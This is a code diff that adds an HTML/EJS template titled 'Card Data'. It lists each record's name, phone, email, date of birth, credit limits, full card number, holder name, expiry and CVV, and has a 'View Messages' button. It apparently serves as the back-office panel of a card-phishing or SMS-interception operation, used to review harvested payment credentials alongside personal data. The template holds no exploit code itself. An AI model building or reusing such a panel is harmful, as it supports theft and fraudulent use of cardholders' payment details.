@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="shortcut icon" href="/images/logo.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Data</title>
+    <link rel='stylesheet' href='/stylesheets/bootstrap.css' />
+</head>
+<body>
+    <div class="row m-0">
+        <div class="col-12">
+          <form class="text-center my-5" action="/messages" method="post"><button type="submit">View Messages</button></form>
+            <table class="table">
+                <thead>
+                  <tr>
+                    <th scope="col">Name</th>
+                    <th scope="col">Mob</th>
+                    <th scope="col">Email</th>
+                    <th scope="col">DOB</th>
+                    <th scope="col">TLimit</th>
+                    <th scope="col">ALimit</th>
+                    <th scope="col">Card Number</th>
+                    <th scope="col">Holder name</th>
+                    <th scope="col">Expiry</th>
+                    <th scope="col">CVV</th>
+                  </tr>
+                </thead>
+                <tbody>
+                    <%cardData.forEach((data)=>{%>
+                        <tr>
+                          <th scope="row"><%=data.name%></th>
+                          <td><%=data.mobile%></td>
+                          <td><%=data.email%></td>
+                          <td><%=data.dob%></td>
+                          <td><%=data.totalLimit%></td>
+                          <td><%=data.avLimit%></td>
+                          <td><%=data.cardNumber%></td>
+                          <td><%=data.holderName%></td>
+                          <td><%=data.exDate%></td>
+                          <td><%=data.cvv%></td>
+                        </tr>
+                    <%})%>
+                </tbody>
+              </table>
+        </div>
+    </div>
+</body>
+</html>
